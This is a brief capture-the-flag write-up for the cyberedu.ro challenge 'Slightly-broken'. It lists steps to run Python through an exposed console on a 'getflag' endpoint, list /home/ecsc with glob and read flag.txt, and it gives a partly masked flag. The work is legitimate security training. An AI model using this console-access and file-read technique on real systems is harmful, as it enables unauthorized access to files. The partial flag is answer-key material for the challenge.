# CyberCTF

cyberedu.ro

* Slightly-broken
  * URL: https://app.cyberedu.ro/challenges/a29f2dc0-9502-11ea-b94c-cf34503f201a/
  * Solution
    1. Remove all getflag input variables
    2. Run the console on the getflag
    3. Import glob
    4. print(glob.glob("/home/ecsc/*")) >> ['/home/ecsc/app.py', '/home/ecsc/flag.txt']
    5. print(open('flag.txt', 'r').read()) >> ECSC{672**************************}
  
